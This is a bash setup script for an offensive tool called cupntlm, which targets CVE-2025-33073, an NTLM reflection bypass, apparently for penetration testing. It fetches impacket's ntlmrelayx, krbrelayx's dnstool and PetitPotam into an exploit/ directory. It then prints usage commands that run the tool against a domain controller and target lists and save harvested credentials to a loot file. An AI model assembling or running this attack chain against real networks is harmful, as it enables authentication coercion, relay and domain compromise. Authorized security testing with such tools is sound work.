#!/bin/bash
# ═══════════════════════════════════════════════════════════
#  cupntlm — Setup Script
#  CVE-2025-33073 | NTLM Reflection Bypass
#  Kali Linux / Debian / Ubuntu
# ═══════════════════════════════════════════════════════════

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log()     { echo -e "${CYAN}[*] $1${NC}"; }
success() { echo -e "${GREEN}[+] $1${NC}"; }
warn()    { echo -e "${YELLOW}[!] $1${NC}"; }
fail()    { echo -e "${RED}[-] $1${NC}"; exit 1; }
hint()    { echo -e "${YELLOW}    → $1${NC}"; }

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════════════╗"
echo "║          cupntlm  |  Setup Script                ║"
echo "║          CVE-2025-33073 NTLM Reflection          ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${NC}"

# ── Directory Setup ───────────────────────────────────────
WORKDIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EXPLOITDIR="$WORKDIR/exploit"

log "Working directory : $WORKDIR"
log "Exploit directory : $EXPLOITDIR"

mkdir -p "$EXPLOITDIR"
success "exploit/ directory ready"

# ── 1. System Tools Check ─────────────────────────────────
echo ""
log "Checking system tools..."
echo ""

MISSING_SYS=()

check_cmd() {
    local cmd="$1"
    local pkg="$2"
    local install_hint="$3"
    if command -v "$cmd" &>/dev/null; then
        success "$cmd ✓"
    else
        warn "$cmd not found"
        hint "Install: $install_hint"
        MISSING_SYS+=("$pkg")
    fi
}

check_cmd "python3"  "python3"     "sudo apt install python3"
check_cmd "pip3"     "python3-pip" "sudo apt install python3-pip"
check_cmd "git"      "git"         "sudo apt install git"
check_cmd "wget"     "wget"        "sudo apt install wget"
check_cmd "nmap"     "nmap"        "sudo apt install nmap"

# netexec / crackmapexec (optional, for SMB signing check)
if command -v netexec &>/dev/null; then
    success "netexec ✓"
elif command -v crackmapexec &>/dev/null || command -v cme &>/dev/null; then
    success "crackmapexec ✓"
else
    warn "netexec / crackmapexec not found  (optional, for SMB signing check)"
    hint "Install: sudo apt install netexec"
fi

# ── 2. Python Libraries Check ─────────────────────────────
echo ""
log "Checking Python libraries..."
echo ""

MISSING_PY=()

check_py() {
    local module="$1"
    local pkg="$2"
    if python3 -c "import $module" 2>/dev/null; then
        success "python3: $module ✓"
    else
        warn "python3: $module not found"
        hint "Install: pip3 install $pkg --break-system-packages"
        MISSING_PY+=("$pkg")
    fi
}

check_py "impacket"  "impacket"
check_py "colorama"  "colorama"
check_py "dns"       "dnspython"

# ── 3. Dependencies (into exploit/ directory) ─────────────
echo ""
log "Fetching dependencies into exploit/ directory..."
echo ""

# ── 3a. ntlmrelayx.py ────────────────────────────────────
if [[ -f "$EXPLOITDIR/ntlmrelayx.py" ]]; then
    success "ntlmrelayx.py already exists, skipping"
else
    log "Searching for ntlmrelayx.py system-wide..."
    NTLM_PATH=$(find /usr -name "ntlmrelayx.py" 2>/dev/null | head -1)

    if [[ -n "$NTLM_PATH" ]]; then
        cp "$NTLM_PATH" "$EXPLOITDIR/"
        success "ntlmrelayx.py copied: $NTLM_PATH → exploit/"
    else
        log "Not found, cloning impacket repository..."
        TMPDIR_IMPACKET="$WORKDIR/.tmp_impacket"
        [[ ! -d "$TMPDIR_IMPACKET" ]] && \
            git clone --quiet https://github.com/fortra/impacket "$TMPDIR_IMPACKET"
        find "$TMPDIR_IMPACKET" -name "ntlmrelayx.py" \
            -exec cp {} "$EXPLOITDIR/" \; 2>/dev/null
        success "ntlmrelayx.py copied into exploit/"
    fi
fi

# ── 3b. dnstool.py + lib/ (krbrelayx) ────────────────────
if [[ -f "$EXPLOITDIR/dnstool.py" && -d "$EXPLOITDIR/lib" ]]; then
    success "dnstool.py + lib/ already exist, skipping"
else
    log "Cloning krbrelayx (for dnstool.py + lib/)..."
    TMPDIR_KRB="$WORKDIR/.tmp_krbrelayx"
    if [[ ! -d "$TMPDIR_KRB" ]]; then
        git clone --quiet https://github.com/dirkjanm/krbrelayx "$TMPDIR_KRB"
    else
        cd "$TMPDIR_KRB" && git pull --quiet && cd "$WORKDIR"
    fi

    # dnstool.py and lib/ always come from the same repo, copy both together
    cp "$TMPDIR_KRB/dnstool.py" "$EXPLOITDIR/"
    cp -r "$TMPDIR_KRB/lib" "$EXPLOITDIR/"
    success "dnstool.py + lib/ copied into exploit/"
fi

# ── 3c. PetitPotam.py ────────────────────────────────────
if [[ -f "$EXPLOITDIR/PetitPotam.py" ]]; then
    success "PetitPotam.py already exists, skipping"
else
    log "Downloading PetitPotam.py..."
    wget -q \
        "https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py" \
        -O "$EXPLOITDIR/PetitPotam.py" \
        && success "PetitPotam.py downloaded into exploit/" \
        || fail "Failed to download PetitPotam.py — check your network connection."
fi

# ── 3d. cupntlm.py → exploit/ ────────────────────────────
if [[ -f "$WORKDIR/cupntlm.py" ]]; then
    cp "$WORKDIR/cupntlm.py" "$EXPLOITDIR/"
    success "cupntlm.py copied into exploit/"
else
    warn "cupntlm.py not found — could not copy into exploit/"
fi

# ── 4. Verification ───────────────────────────────────────
echo ""
log "Verifying files..."
echo ""

check_file() {
    if [[ -f "$EXPLOITDIR/$1" ]]; then
        success "exploit/$1 ✓"
    else
        warn "exploit/$1 missing!"
    fi
}

check_file "cupntlm.py"
check_file "ntlmrelayx.py"
check_file "dnstool.py"
if [[ -d "$EXPLOITDIR/lib" ]]; then
    success "exploit/lib/ ✓"
else
    warn "exploit/lib/ missing!"
fi
check_file "PetitPotam.py"

# ── 5. Summary ────────────────────────────────────────────
echo ""
echo -e "${CYAN}══════════════════════════════════════════════${NC}"

if [[ ${#MISSING_SYS[@]} -gt 0 || ${#MISSING_PY[@]} -gt 0 ]]; then
    echo -e "${YELLOW}  Setup complete — some dependencies are missing!${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
    echo ""
    if [[ ${#MISSING_SYS[@]} -gt 0 ]]; then
        echo -e "  ${YELLOW}Missing system packages:${NC} ${MISSING_SYS[*]}"
        hint "sudo apt install ${MISSING_SYS[*]}"
    fi
    if [[ ${#MISSING_PY[@]} -gt 0 ]]; then
        echo -e "  ${YELLOW}Missing Python libraries:${NC} ${MISSING_PY[*]}"
        hint "pip3 install ${MISSING_PY[*]} --break-system-packages"
    fi
else
    echo -e "${GREEN}  Setup completed successfully!${NC}"
    echo -e "${CYAN}══════════════════════════════════════════════${NC}"
fi

echo ""
echo -e "  ${CYAN}Usage:${NC}"
echo ""
echo -e "  ${YELLOW}# Check permissions first:${NC}"
echo -e "  cd exploit"
echo -e "  sudo python3 cupntlm.py check \\"
echo -e "    --domain lab.local --user pentester --pass 'P@ss' \\"
echo -e "    --dc-ip 10.0.0.1 --relay-ip 192.168.1.100"
echo ""
echo -e "  ${YELLOW}# Per-target mode (separate DNS record per target):${NC}"
echo -e "  sudo python3 cupntlm.py per-target \\"
echo -e "    --targets targets.txt \\"
echo -e "    --domain lab.local --user pentester --pass 'P@ss' \\"
echo -e "    --dc-ip 10.0.0.1 --relay-ip 192.168.1.100 --loot loot.txt"
echo ""
echo -e "  ${YELLOW}# Single mode (one DNS record, persistent relay):${NC}"
echo -e "  sudo python3 cupntlm.py single \\"
echo -e "    --targets targets.txt \\"
echo -e "    --domain lab.local --user pentester --pass 'P@ss' \\"
echo -e "    --dc-ip 10.0.0.1 --relay-ip 192.168.1.100 --loot loot.txt"
echo ""
